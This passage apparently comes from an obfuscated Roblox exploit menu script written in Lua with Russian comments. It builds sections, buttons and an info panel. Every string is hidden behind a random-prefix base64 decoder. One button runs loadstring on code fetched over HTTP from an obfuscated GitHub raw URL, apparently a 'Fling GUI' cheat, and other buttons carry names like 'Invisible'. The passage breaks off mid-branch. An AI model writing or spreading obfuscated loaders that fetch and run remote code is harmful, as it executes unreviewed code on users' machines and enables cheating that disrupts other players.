-- Создаем функцию, которая создает секцию меню
local function createSection(name, index)
    -- Создаем локальную переменную для хранения фрейма секции
    local section = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('jQvnbjlOqdQlmMfzLSwWCygcUzVOPLHqXnWQHiAyqMZLGLGsHtEujRPRnJhbWU='), menu)
    section.Name = name
    section.Size = UDim2.new(0.2, 0, 0.9, 0)
    section.Position = UDim2.new(0.2 * (index - 1), 0, 0.1, 0)
    section.BackgroundColor3 = Color3.new(0, 0, 0)
    section.BackgroundTransparency = 1

    -- Создаем локальную переменную для хранения заголовка секции
    local sectionTitle = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('oLKmhDfvMVZQdiJDiZXiCAEqijsVnvYsCbcMQkNzdFSoUNalzjLnttKVGV4dExhYmVs'), section)
    sectionTitle.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('aFSMzFDqGOkbpvzPCtLAZAZoiNcShLejAOBkyMTEBUIwJuKSUhQUPViU2VjdGlvblRpdGxl')
    sectionTitle.Size = UDim2.new(1, 0, 0.1, 0)
    sectionTitle.Position = UDim2.new(0, 0, 0, 0)
    sectionTitle.BackgroundColor3 = Color3.new(0, 0, 0)
    sectionTitle.BackgroundTransparency = 0.5
    sectionTitle.Text = name
    sectionTitle.TextColor3 = Color3.new(1, 1, 1)
    sectionTitle.TextScaled = true
    sectionTitle.Font = Enum.Font.SourceSansBold

    -- Возвращаем фрейм секции
    return section
end

-- Создаем функцию, которая создает кнопку меню
local function createButton(name, section, index)
    -- Создаем локальную переменную для хранения кнопки
    local button = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('oRgEVIWUWKGxxeyCdxAKlskAFbhgOxaoCkrgQeROaRKVmNWWJxofVcyVGV4dEJ1dHRvbg=='), section)
    button.Name = name
    button.Size = UDim2.new(0.9, 0, 0.1, 0)
    button.Position = UDim2.new(0.05, 0, 0.1 * (index + 1), 0)
    button.BackgroundColor3 = colors[section.Name]
    button.BackgroundTransparency = 0.5
    button.Text = name
    button.TextColor3 = Color3.new(1, 1, 1)
    button.TextScaled = true
    button.Font = Enum.Font.SourceSansBold

    -- Возвращаем кнопку
    return button
end

-- Создаем функцию, которая создает информацию о меню
local function createInformation(section)
    -- Создаем локальную переменную для хранения текста информации
    local infoText = Instance.new(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PLSWXFlZCZpdkHVvYrUqxVQARxmNuFIwgcLIhSpqyXpYihCvnbSqeOeVGV4dExhYmVs'), section)
    infoText.Name = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PGlwhBBdYuMaWhshymGfqpbEDPdSGfGigvZKToSXTkxTADTsteBiIDjSW5mb1RleHQ=')
    infoText.Size = UDim2.new(0.9, 0, 0.8, 0)
    infoText.Position = UDim2.new(0.05, 0, 0.2, 0)
    infoText.BackgroundColor3 = Color3.new(0, 0, 0)
    infoText.BackgroundTransparency = 0.5
    infoText.Text = NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('MlozqupOzIKFphYprcJyJLUzqWigUNosNolIHZkTdexDSOyRZKniVCJKOKBoOC5keKBoOKAouKBoO+5j+KBoOKAouKBoClUaGlzIGlzIHRoZSBHdWkgbWVudSAuXG4gWW91IGNhbiBhY3RpdmF0ZSB0aGUgc2NyaXB0IGJ5IGNsaWNraW5nIG9uIHRoZSBidXR0b24uXG4gRW5qb3kgdGhlIGdhbWUhPuKBoC7igaA8')
    infoText.TextColor3 = Color3.new(1, 1, 1)
    infoText.TextScaled = true
    infoText.Font = Enum.Font.SourceSansBold
    infoText.TextWrapped = true
end

-- -- Создаем функцию, которая создает все секции и кнопки меню
local function createMenu()
    -- Перебираем все секции
    for i, sectionName in pairs(sections) do
        -- Создаем секцию
        local section = createSection(sectionName, i)
        
        -- Если секция называется NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('AWqBbbXdZcfazoNwVUsUfAvWOSjPsoLjcVkocIglKlVxdPajeUywfTeSW5mb3JtYXRpb24='), то создаем информацию о меню
        if sectionName == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('PjsVNuVIeWMlwFjVPETajbjafNoIPYPMcPdrfpPKGemhkKLozRCTiquSW5mb3JtYXRpb24=') then
            createInformation(section)
        end
        
        -- Перебираем все кнопки в секции
        for j, buttonName in ipairs(buttons[sectionName]) do
            -- Создаем кнопку
            local button = createButton(buttonName, section, j)
            
            -- Добавляем функцию, которая срабатывает при нажатии на кнопку
            button.MouseButton1Click:Connect(function()
                if button.Name == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('txNqYQHOgOzrqHhmkmxHSLxwaTRsubGBkUsSgbBbbMwNCtnmGgXUqjmRmxpbmc=') then
                    loadstring(game:HttpGet(NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('msLcpvSDOwEBmwXlxZVrfBtpBYgIQTyPjIOXxuUZIQpxFAsHFNxghFEaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzBCZW4xL2ZlLi9tYWluL0ZsaW5nJTIwR1VJ')))()
                elseif button.Name == NODWbyzUrQUnkBuZdBDiIMaslifGIjNjoRotSJDviDcuXtKoowdXsZMjzNnLDAXRGSEMyomZTEBLn('yvzjYvdIPdXJhbEBatTfMclqnBMMMeKxnVzsgCTuKCMPJrdFHANDVRXSW52aXNpYmxl') then
